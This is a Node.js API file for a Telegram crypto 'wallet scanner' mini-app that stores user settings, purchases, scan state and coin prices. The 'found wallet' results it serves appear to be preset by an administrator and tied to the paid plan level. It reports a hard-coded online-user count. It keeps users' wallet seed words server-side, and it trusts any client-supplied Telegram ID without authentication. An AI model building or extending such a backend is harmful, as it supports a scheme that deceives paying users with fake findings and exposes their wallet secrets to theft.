/**
 * api/app.js — Main API endpoint (Vercel Serverless Function)
 * يعادل api/app.php بالكامل — مُحوَّل لـ Node.js + PostgreSQL (Neon)
 */

const { db, ensureSchema } = require('./_db');
const { decryptPayload, encResp, fail, ok, jd, je, getIp, EK } = require('./_helpers');

const BOT_TOKEN = process.env.BOT_TOKEN || '';
const ADMIN_ID  = process.env.ADMIN_ID  || '';

// ── Action map (numeric → string) ─────────────────────────────────
const ACTION_MAP = {
  1:'init', 2:'save_wallet', 3:'clear_wallet', 4:'save_boost',
  5:'save_archive', 6:'clear_archive', 7:'save_archive_all',
  8:'save_getted', 9:'save_dash', 10:'save_settings',
  11:'set_splash_done', 12:'check_ip_ban', 13:'ban_ip',
  14:'save_trial_count', 15:'get_online_count', 16:'save_work_data',
  17:'set_toast_seen', 18:'save_fndwlet', 19:'get_toast_dialog',
  20:'get_found_entry', 21:'get_messages', 22:'set_msg_key',
  23:'get_promo', 24:'save_purchased', 25:'check_purchased',
  26:'save_getted_keys', 27:'get_getted_keys', 28:'save_found',
  29:'scan_start_batch', 30:'get_coin_prices', 31:'save_coin_prices',
  32:'get_toast_dialog', 33:'set_jumps_key', 34:'save_fndwlet',
  35:'set_scan_state', 36:'get_scan_state', 37:'save_getted_batch',
};

async function sendTgNotify(tgId, message) {
  if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: tgId, text: message, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(5000),
    });
  } catch {}
}

// ── Helper: get user (need) ────────────────────────────────────────
async function need(sql, body, res) {
  const tid = parseInt(body.tg_id || 0);
  if (!tid) { fail(res, 'Missing tg_id'); return null; }
  const rows = await sql`SELECT * FROM users WHERE tg_id = ${tid} LIMIT 1`;
  if (!rows.length) { fail(res, 'User not found: ' + tid); return null; }
  return [tid, rows[0]];
}

function decodeUser(u) {
  if (!u) return {};
  const jsonFields = ['tg_data','wallet_current','wallet_history','archive','settings','boost_data','dash_data','fndwlet'];
  for (const f of jsonFields) {
    if (u[f] !== null && u[f] !== undefined) {
      u[f] = jd(u[f], u[f]);
    }
  }
  u.trial_count = parseInt(u.trial_count || 0);
  return u;
}

// ── Main Handler ───────────────────────────────────────────────────
module.exports = async function handler(req, res) {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { res.status(204).end(); return; }
  if (req.method !== 'POST')    { fail(res, 'Method not allowed', 405); return; }

  let body;
  try {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const raw = Buffer.concat(chunks).toString();
    body = JSON.parse(raw || '{}');
  } catch { fail(res, 'Invalid JSON'); return; }

  // Decrypt payload if encrypted
  if (body._p) {
    try { body = decryptPayload(body._p); }
    catch { fail(res, 'decrypt_failed'); return; }
  }

  let action = body.action || '';
  if (!action) { fail(res, 'Missing action'); return; }
  if (!isNaN(action)) {
    action = ACTION_MAP[parseInt(action)] || '';
    if (!action) { ok(res, { ok: false, err: 'invalid' }); return; }
  }

  const sql = await db();
  await ensureSchema(sql);

  // IP ban check
  const ip = getIp(req);
  const ipBan = await sql`SELECT tg_id FROM bans WHERE type = 'ip' AND value = ${ip} LIMIT 1`;
  if (ipBan.length) { fail(res, 'banned'); return; }

  // ── Route actions ──────────────────────────────────────────────
  switch (action) {

    // ── init ──────────────────────────────────────────────────────
    case 'init': {
      const tg = body.tg;
      if (!tg || !tg.id) { fail(res, 'Missing tg'); return; }
      const tid = parseInt(tg.id);
      if (tid <= 0) { fail(res, 'Bad tg id'); return; }

      // TG ban check
      const tgBan = await sql`SELECT tg_id FROM bans WHERE type = 'tg_id' AND value = ${String(tid)} LIMIT 1`;
      if (tgBan.length) { fail(res, 'banned'); return; }

      const tgData = je({
        name:     ((tg.first_name||'') + ' ' + (tg.last_name||'')).trim(),
        username: tg.username || '',
        lang:     (tg.language_code || 'en').substring(0, 10),
        premium:  !!tg.is_premium,
        photo:    tg.photo_url || null,
      });
      const defSettings = '{"background":0,"ai_search":0,"deriv_paths":0,"auto_withdraw":0,"notification":0,"depth":"normal","lang":"en","theme":"black"}';
      const defBoost    = '{"count":0,"end_ts":null,"running":false}';
      const defDash     = '{"all_time":0,"last30":0,"coins":{},"pending_val":0,"pending_found":0}';

      await sql`
        INSERT INTO users (tg_id, tg_data, settings, boost_data, dash_data)
        VALUES (${tid}, ${tgData}, ${defSettings}, ${defBoost}, ${defDash})
        ON CONFLICT (tg_id) DO UPDATE SET
          tg_data   = EXCLUDED.tg_data,
          last_seen = NOW()
      `;

      const rows = await sql`SELECT * FROM users WHERE tg_id = ${tid} LIMIT 1`;
      const u    = decodeUser(rows[0]);

      if (u.fndwlet) {
        u.found_count       = parseInt(u.fndwlet.found_count  || 0);
        u.found_pending_val = parseFloat(u.fndwlet.pending_val || 0);
      }

      if (body.with_online) {
        const onRow = await sql`SELECT value FROM settings WHERE key = 'online_count' LIMIT 1`;
        u._online_count = onRow.length ? String(onRow[0].value) : '567';
      }
      if (body.with_messages) {
        const seenKeys2 = jd(u.msg_key, []) || [];
        const userPlan2 = parseInt(u.plan_level || 0);
        const allMsgs2  = await sql`SELECT * FROM message WHERE active=1 ORDER BY count ASC`;
        u._messages = allMsgs2
          .filter(m => userPlan2 >= parseInt(m.level || 0))
          .map(m => ({ id: parseInt(m.id), count: parseInt(m.count), msg: String(m.MsgBox), key: String(m.Key), seen: seenKeys2.includes(String(m.Key)) }));
        u._msg_seen = seenKeys2;
      }
      if (body.with_promo) {
        const uPlan2     = parseInt(u.plan_level || 0);
        const promoRow   = await sql`SELECT value, level FROM settings WHERE key='promo_code' LIMIT 1`;
        const pCode2     = promoRow.length ? String(promoRow[0].value) : '';
        const pLevel2    = promoRow.length ? parseInt(promoRow[0].level) : 0;
        u._promo = { code: pCode2, available: pCode2 !== '' && uPlan2 >= pLevel2, required_level: pLevel2 };
      }
      if (body.with_jumps) {
        const seenJumpKey = String(u.jumps_key || '');
        const allJumps    = await sql`SELECT * FROM jumps WHERE active=1 ORDER BY CAST(title AS INTEGER) ASC`;
        u._jumps    = allJumps.map(j => ({ threshold: parseInt(j.title), title2: String(j.title2), title3: String(j.title3), title4: String(j.title4), key: String(j.title5) }));
        u.jumps_key = seenJumpKey;
      }
      if (body.with_scan_state) {
        const ssRow = await sql`SELECT scan_state FROM users WHERE tg_id=${tid}`;
        let ssVal = { active: 0, start_time: 0 };
        if (ssRow.length && ssRow[0].scan_state) {
          const parsed = jd(ssRow[0].scan_state, null);
          if (parsed) ssVal = parsed;
        }
        u.scan_state = ssVal;
      }
      if (body.with_coin_prices) {
        const cpRows = await sql`SELECT coin_id, symbol, price_usd FROM coingecko`;
        const cpOut  = {};
        for (const cp of cpRows) cpOut[cp.coin_id] = { symbol: cp.symbol, price_usd: parseFloat(cp.price_usd) };
        if (Object.keys(cpOut).length) u._coin_prices = cpOut;
      }
      if (body.with_toast) {
        const td2    = await sql`SELECT value, level FROM settings WHERE key='toast_dialog' LIMIT 1`;
        const uPlanTd = parseInt(u.plan_level || 0);
        if (td2.length && td2[0].value && uPlanTd <= parseInt(td2[0].level)) {
          u._toast_dialog = { text: String(td2[0].value), level: parseInt(td2[0].level) };
        }
      }
      const mtRow = await sql`SELECT value FROM settings WHERE key = 'max_trials' LIMIT 1`;
      u.max_trials = mtRow.length ? parseInt(mtRow[0].value) : 1000;
      ok(res, { user: u });
      break;
    }

    // ── save_wallet ───────────────────────────────────────────────
    case 'save_wallet': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid, u] = r;
      const name  = String(body.name || '').substring(0, 100);
      const words = body.words || [];
      const ts    = parseInt(body.ts || Date.now());
      const cur   = je({ name, words, ts });
      const hist  = jd(u.wallet_history, []) || [];
      hist.push({ name, words, ts });
      await sql`UPDATE users SET wallet_current=${cur}, wallet_history=${je(hist)}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    case 'clear_wallet':
      ok(res, { ok: true });
      break;

    // ── save_boost ────────────────────────────────────────────────
    case 'save_boost': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const d = { count: parseInt(body.count||0), end_ts: body.end_ts||null, running: !!body.running };
      await sql`UPDATE users SET boost_data=${je(d)}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    // ── save_archive ──────────────────────────────────────────────
    case 'save_archive': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid, u] = r;
      if (!body.item) { fail(res, 'Missing item'); return; }
      const arch = jd(u.archive, []) || [];
      arch.push(body.item);
      await sql`UPDATE users SET archive=${je(arch)}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    case 'clear_archive': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      await sql`UPDATE users SET archive=NULL, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    case 'save_archive_all': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const arch = body.archive || [];
      const val  = arch.length ? je(arch) : null;
      await sql`UPDATE users SET archive=${val}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    // ── save_found / save_getted ──────────────────────────────────
    case 'save_found':
    case 'save_getted': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const wf = je({
        found_count:   parseInt(body.found_count||0),
        pending_found: parseInt(body.pending_found||0),
        pending_val:   parseFloat(body.pending_val||0),
        found_body:    body.found_body||'',
      });
      await sql`UPDATE users SET fndwlet=${wf}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    // ── save_dash ─────────────────────────────────────────────────
    case 'save_dash': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const r2 = await sql`SELECT dash_data FROM users WHERE tg_id=${tid} LIMIT 1`;
      const dd = (r2.length ? jd(r2[0].dash_data, {}) : {}) || {};
      if ('all_time'      in body) dd.all_time      = parseFloat(body.all_time);
      if ('last30'        in body) dd.last30        = parseFloat(body.last30);
      if ('last30_ts'     in body) dd.last30_ts     = parseInt(body.last30_ts);
      if ('coins'         in body) dd.coins         = body.coins;
      if ('pending_val'   in body) dd.pending_val   = parseFloat(body.pending_val);
      if ('pending_found' in body) dd.pending_found = parseInt(body.pending_found);
      await sql`UPDATE users SET dash_data=${je(dd)}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res, { dash_data: dd });
      break;
    }

    // ── save_settings ─────────────────────────────────────────────
    case 'save_settings': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid, u] = r;
      const s = jd(u.settings, {}) || {};
      for (const k of ['background','ai_search','deriv_paths','auto_withdraw','notification'])
        if (k in body) s[k] = body[k] ? 1 : 0;
      for (const k of ['depth','lang','theme'])
        if (k in body) s[k] = String(body[k]);
      await sql`UPDATE users SET settings=${je(s)}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res, { settings: s });
      break;
    }

    // ── set_splash_done ───────────────────────────────────────────
    case 'set_splash_done': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      await sql`UPDATE users SET splash_done=1, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    // ── check_ip_ban ──────────────────────────────────────────────
    case 'check_ip_ban': {
      const cip = getIp(req);
      const bq  = await sql`SELECT id FROM bans WHERE type='ip' AND value=${cip} LIMIT 1`;
      ok(res, { banned: bq.length > 0 });
      break;
    }

    // ── ban_ip ────────────────────────────────────────────────────
    case 'ban_ip': {
      const ip2 = getIp(req);
      if (ip2) {
        try {
          await sql`INSERT INTO bans (type, value) VALUES ('ip', ${ip2}) ON CONFLICT (type, value) DO NOTHING`;
        } catch {}
      }
      ok(res);
      break;
    }

    // ── save_trial_count ──────────────────────────────────────────
    case 'save_trial_count': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const cnt = parseInt(body.count || 0);
      await sql`UPDATE users SET trial_count=${cnt}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res, { trial_count: cnt });
      break;
    }

    // ── get_online_count ──────────────────────────────────────────
    case 'get_online_count': {
      const row = await sql`SELECT value FROM settings WHERE key = 'online_count' LIMIT 1`;
      ok(res, { online_count: row.length ? String(row[0].value) : '567' });
      break;
    }

    // ── get_jumps ─────────────────────────────────────────────────
    case 'get_jumps': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const chk   = parseInt(body.checked || 0);
      const uRow  = await sql`SELECT jumps_key FROM users WHERE tg_id=${tid} LIMIT 1`;
      const seenJ = uRow.length ? String(uRow[0].jumps_key || '') : '';
      const jRow  = await sql`
        SELECT * FROM jumps
        WHERE active=1 AND CAST(title AS INTEGER) <= ${chk} AND title5 != ${seenJ}
        ORDER BY CAST(title AS INTEGER) DESC LIMIT 1
      `;
      if (jRow.length) {
        ok(res, { found: true, title: String(jRow[0].title), title2: String(jRow[0].title2), title3: String(jRow[0].title3), title4: String(jRow[0].title4), title5: String(jRow[0].title5) });
      } else {
        ok(res, { found: false });
      }
      break;
    }

    // ── set_toast_seen ────────────────────────────────────────────
    case 'set_toast_seen': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const tk = String(body.key || '').substring(0, 100);
      await sql`UPDATE users SET toast_key=${tk} WHERE tg_id=${tid}`;
      ok(res, { ok: true });
      break;
    }

    // ── get_found_entry ───────────────────────────────────────────
    case 'get_found_entry': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const uPlan = await sql`SELECT plan_level FROM users WHERE tg_id=${tid}`;
      const lvl   = uPlan.length ? parseInt(uPlan[0].plan_level) : 0;
      const entries = await sql`SELECT * FROM getted WHERE active=1 AND level=${lvl} ORDER BY checked ASC`;
      if (entries.length) {
        ok(res, { found: true, entries: entries.map(e => ({ found: true, id: parseInt(e.id), checked: parseInt(e.checked), coin: String(e.coin), price: String(e.price), walet: e.walet ? String(e.walet) : null, key: String(e.key || 'lt1') })) });
      } else {
        ok(res, { found: false, entries: [] });
      }
      break;
    }

    // ── save_work_data ────────────────────────────────────────────
    case 'save_work_data': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const wd = String(body.work_data || '').substring(0, 255);
      await sql`UPDATE users SET work_data=${wd}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res, { work_data: wd });
      break;
    }

    // ── get_messages ──────────────────────────────────────────────
    case 'get_messages': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const uMsgRow  = await sql`SELECT msg_key, plan_level FROM users WHERE tg_id=${tid}`;
      const seenKeys = jd(uMsgRow[0]?.msg_key, []) || [];
      const userPlan = parseInt(uMsgRow[0]?.plan_level || 0);
      const allMsgs  = await sql`SELECT * FROM message WHERE active=1 ORDER BY count ASC`;
      const outMsgs  = allMsgs
        .filter(m => parseInt(m.level) === userPlan)
        .map(m => ({ id: parseInt(m.id), count: parseInt(m.count), msg: String(m.MsgBox), key: String(m.Key), seen: seenKeys.includes(String(m.Key)) }));
      ok(res, { messages: outMsgs, seen_keys: seenKeys });
      break;
    }

    // ── set_msg_key ───────────────────────────────────────────────
    case 'set_msg_key': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const msgKey  = String(body.key || '').substring(0, 100);
      const mkRow   = await sql`SELECT msg_key FROM users WHERE tg_id=${tid}`;
      const mkKeys  = jd(mkRow[0]?.msg_key, []) || [];
      if (msgKey && !mkKeys.includes(msgKey)) mkKeys.push(msgKey);
      await sql`UPDATE users SET msg_key=${je(mkKeys)} WHERE tg_id=${tid}`;
      ok(res, { ok: true });
      break;
    }

    // ── get_promo ─────────────────────────────────────────────────
    case 'get_promo': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const uRow      = await sql`SELECT plan_level FROM users WHERE tg_id=${tid}`;
      const uLvl      = parseInt(uRow[0]?.plan_level || 0);
      const promoRow  = await sql`SELECT value, level FROM settings WHERE key='promo_code' LIMIT 1`;
      const promoCode = promoRow.length ? String(promoRow[0].value) : '';
      const promoLvl  = promoRow.length ? parseInt(promoRow[0].level) : 0;
      ok(res, { code: promoCode, available: promoCode !== '' && uLvl >= promoLvl, required_level: promoLvl });
      break;
    }

    // ── save_purchased ────────────────────────────────────────────
    case 'save_purchased': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const upgLevel = parseInt(body.upgrade_level || 0);
      const coin     = String(body.coin || '').substring(0, 20);
      const price    = String(body.price || '').substring(0, 50);
      const info     = body.info ? je(body.info) : null;
      const planLvl  = parseInt(body.plan_level || 0);
      const ins = await sql`
        INSERT INTO purchased (tg_id, info, plan_level, upgrade_level, coin, price, last_seen, work_now)
        VALUES (${tid}, ${info}, ${planLvl}, ${upgLevel}, ${coin}, ${price}, NOW(), 'OFF')
        RETURNING id
      `;
      ok(res, { inserted_id: ins[0].id });
      break;
    }

    // ── check_purchased ───────────────────────────────────────────
    case 'check_purchased': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const rows = await sql`SELECT * FROM purchased WHERE tg_id=${tid} AND work_now='ON' LIMIT 1`;
      if (rows.length) {
        const row      = rows[0];
        const newLevel = parseInt(row.upgrade_level);
        const booster  = parseInt(row.booster || 0);
        await sql`UPDATE users SET plan_level=${newLevel} WHERE tg_id=${tid}`;
        if (booster > 0) {
          const bRow  = await sql`SELECT boost_data FROM users WHERE tg_id=${tid}`;
          const boost = jd(bRow[0]?.boost_data, {}) || {};
          boost.count = booster;
          await sql`UPDATE users SET boost_data=${je(boost)} WHERE tg_id=${tid}`;
        }
        await sql`UPDATE purchased SET work_now='Done!' WHERE id=${row.id}`;

        // Send Telegram notification via aps endpoint (internal call)
        const baseUrl = process.env.VERCEL_URL
          ? `https://${process.env.VERCEL_URL}`
          : (process.env.APP_BASE_URL || '');
        if (baseUrl) {
          try {
            const apsMsg = `Activated Successfully!\n\nYour purchase is confirmed. Plan is now active.\nOrder ID: VA-D${tid}\nNew Level: ${newLevel}\n\nThank you!`;
            const payload = JSON.stringify({ id: String(tid), c: '1', msg: apsMsg });
            const utf8  = encodeURIComponent(payload);
            const bytes = Buffer.from(utf8.replace(/%([0-9A-Fa-f]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16))), 'latin1');
            const enc   = Buffer.alloc(bytes.length);
            for (let i = 0; i < bytes.length; i++) enc[i] = bytes[i] ^ EK.charCodeAt(i % EK.length);
            fetch(`${baseUrl}/api/aps`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ _p: enc.toString('base64') }),
              signal: AbortSignal.timeout(10000),
            }).catch(() => {});
          } catch {}
        }

        ok(res, { upgraded: true, new_level: newLevel, booster });
      } else {
        ok(res, { upgraded: false });
      }
      break;
    }

    // ── save_getted_keys ──────────────────────────────────────────
    case 'save_getted_keys': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      await sql`UPDATE users SET getted_save=${je(body.keys || [])} WHERE tg_id=${tid}`;
      ok(res, { ok: true });
      break;
    }

    // ── save_getted_batch ─────────────────────────────────────────
    case 'save_getted_batch': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      if (body.keys !== undefined) {
        await sql`UPDATE users SET getted_save=${je(body.keys)} WHERE tg_id=${tid}`;
      }
      if (body.found_count !== undefined || body.found_body !== undefined) {
        const wf = je({ found_count: parseInt(body.found_count||0), pending_found: parseInt(body.pending_found||0), pending_val: parseFloat(body.pending_val||0), found_body: body.found_body||'' });
        await sql`UPDATE users SET fndwlet=${wf}, last_seen=NOW() WHERE tg_id=${tid}`;
      }
      if (body.all_time !== undefined || body.coins !== undefined) {
        const r3 = await sql`SELECT dash_data FROM users WHERE tg_id=${tid} LIMIT 1`;
        const dd3 = (r3.length ? jd(r3[0].dash_data, {}) : {}) || {};
        if ('all_time'      in body) dd3.all_time      = parseFloat(body.all_time);
        if ('last30'        in body) dd3.last30        = parseFloat(body.last30);
        if ('last30_ts'     in body) dd3.last30_ts     = parseInt(body.last30_ts);
        if ('coins'         in body) dd3.coins         = body.coins;
        if ('pending_val'   in body) dd3.pending_val   = parseFloat(body.pending_val);
        if ('pending_found' in body) dd3.pending_found = parseInt(body.pending_found);
        await sql`UPDATE users SET dash_data=${je(dd3)}, last_seen=NOW() WHERE tg_id=${tid}`;
      }
      ok(res, { ok: true });
      break;
    }

    // ── get_getted_keys ───────────────────────────────────────────
    case 'get_getted_keys': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const row = await sql`SELECT getted_save FROM users WHERE tg_id=${tid}`;
      ok(res, { keys: jd(row[0]?.getted_save, []) || [] });
      break;
    }

    // ── scan_start_batch ──────────────────────────────────────────
    case 'scan_start_batch': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid, uBatch] = r;

      if (body.trial_count !== undefined) {
        await sql`UPDATE users SET trial_count=${parseInt(body.trial_count)}, last_seen=NOW() WHERE tg_id=${tid}`;
      }
      if (body.work_data !== undefined) {
        await sql`UPDATE users SET work_data=${String(body.work_data).substring(0,255)}, last_seen=NOW() WHERE tg_id=${tid}`;
      }

      const batchKeys    = jd(uBatch.getted_save, []) || [];
      const batchPlanLvl = parseInt(uBatch.plan_level || 0);
      const batchEntries = (await sql`SELECT * FROM getted WHERE active=1 AND level=${batchPlanLvl} ORDER BY checked ASC`).map(e => ({ id: parseInt(e.id), checked: parseInt(e.checked), coin: String(e.coin), price: String(e.price), walet: e.walet ? String(e.walet) : null, key: String(e.key || 'lt1') }));
      const batchSeenKeys = jd(uBatch.msg_key, []) || [];
      const batchUserPlan = parseInt(uBatch.plan_level || 0);
      const batchAllMsgs  = await sql`SELECT * FROM message WHERE active=1 ORDER BY count ASC`;
      const batchOutMsgs  = batchAllMsgs.filter(m => parseInt(m.level) === batchUserPlan).map(m => ({ id: parseInt(m.id), count: parseInt(m.count), msg: String(m.MsgBox), key: String(m.Key), seen: batchSeenKeys.includes(String(m.Key)) }));
      const mtRow         = await sql`SELECT value FROM settings WHERE key='max_trials' LIMIT 1`;
      const maxTrials     = mtRow.length ? parseInt(mtRow[0].value) : 1000;

      if (body.bg_on && body.start_time) {
        const bsState = je({ active: 1, start_time: parseInt(body.start_time), chains: body.chains || [], boost_sec: parseInt(body.boost_sec || 0), checked: 0 });
        await sql`UPDATE users SET scan_state=${bsState}, last_seen=NOW() WHERE tg_id=${tid}`;
      }
      ok(res, { keys: batchKeys, found_entries: batchEntries, messages: batchOutMsgs, seen_keys: batchSeenKeys, max_trials: maxTrials, trial_count: parseInt(uBatch.trial_count || 0), work_data: uBatch.work_data || null, dash_data: jd(uBatch.dash_data, {}) || {}, fndwlet: jd(uBatch.fndwlet, {}) || {} });
      break;
    }

    // ── get_coin_prices ───────────────────────────────────────────
    case 'get_coin_prices': {
      const rows = await sql`SELECT coin_id, symbol, price_usd, updated_at FROM coingecko`;
      const prices = {};
      let updatedAt = null;
      for (const row of rows) {
        prices[row.coin_id] = { symbol: row.symbol, price_usd: parseFloat(row.price_usd) };
        if (!updatedAt || row.updated_at < updatedAt) updatedAt = row.updated_at;
      }
      ok(res, { prices, updated_at: updatedAt });
      break;
    }

    // ── save_coin_prices ──────────────────────────────────────────
    case 'save_coin_prices': {
      const coins = body.prices || {};
      if (!Object.keys(coins).length) { ok(res, { ok: false }); break; }
      for (const [coinId, data] of Object.entries(coins)) {
        const cid    = String(coinId).substring(0, 50);
        const symbol = String(data.symbol || '').substring(0, 10);
        const price  = parseFloat(data.price_usd || 0);
        await sql`
          INSERT INTO coingecko (coin_id, symbol, price_usd, updated_at)
          VALUES (${cid}, ${symbol}, ${price}, NOW())
          ON CONFLICT (coin_id) DO UPDATE SET price_usd=EXCLUDED.price_usd, symbol=EXCLUDED.symbol, updated_at=NOW()
        `;
      }
      ok(res, { ok: true });
      break;
    }

    // ── get_toast_dialog ──────────────────────────────────────────
    case 'get_toast_dialog': {
      const tdRow = await sql`SELECT value, level FROM settings WHERE key='toast_dialog' LIMIT 1`;
      if (!tdRow.length || !tdRow[0].value) { ok(res, { toast_dialog: '', level: 3 }); break; }
      const tdTid  = parseInt(body.tg_id || 0);
      let tdPlan   = 0;
      if (tdTid) {
        const tdUser = await sql`SELECT plan_level FROM users WHERE tg_id=${tdTid}`;
        tdPlan = tdUser.length ? parseInt(tdUser[0].plan_level) : 0;
      }
      if (tdPlan > parseInt(tdRow[0].level)) { ok(res, { toast_dialog: '', level: parseInt(tdRow[0].level) }); break; }
      ok(res, { toast_dialog: String(tdRow[0].value), level: parseInt(tdRow[0].level) });
      break;
    }

    // ── set_jumps_key ─────────────────────────────────────────────
    case 'set_jumps_key': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const jk = String(body.key || '').substring(0, 100);
      await sql`UPDATE users SET jumps_key=${jk} WHERE tg_id=${tid}`;
      ok(res, { ok: true });
      break;
    }

    // ── save_fndwlet ──────────────────────────────────────────────
    case 'save_fndwlet': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const wf2 = je({ found_count: parseInt(body.found_count||0), pending_found: parseInt(body.pending_found||0), pending_val: parseFloat(body.pending_val||0), found_body: body.found_body||'' });
      await sql`UPDATE users SET fndwlet=${wf2}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    // ── set_scan_state ────────────────────────────────────────────
    case 'set_scan_state': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const active     = parseInt(body.active || 0);
      const start_time = parseInt(body.start_time || 0);
      const chains     = body.chains !== undefined ? body.chains : null;
      const checked    = body.checked !== undefined ? parseInt(body.checked) : null;
      const curRow     = await sql`SELECT scan_state FROM users WHERE tg_id=${tid}`;
      const prev       = jd(curRow[0]?.scan_state, {}) || {};
      const sstate = {
        active,
        start_time: start_time || (prev.start_time || 0),
        chains:     chains !== null ? chains : (prev.chains || []),
        checked:    checked !== null ? checked : (prev.checked || 0),
      };
      await sql`UPDATE users SET scan_state=${je(sstate)}, last_seen=NOW() WHERE tg_id=${tid}`;
      ok(res);
      break;
    }

    // ── get_scan_state ────────────────────────────────────────────
    case 'get_scan_state': {
      const r = await need(sql, body, res); if (!r) return;
      const [tid] = r;
      const row2 = await sql`SELECT scan_state FROM users WHERE tg_id=${tid}`;
      let ss = { active: 0, start_time: 0 };
      if (row2.length && row2[0].scan_state) {
        const parsed = jd(row2[0].scan_state, null);
        if (parsed) ss = parsed;
      }
      ok(res, ss);
      break;
    }

    default:
      fail(res, 'Unknown action: ' + action);
  }
};
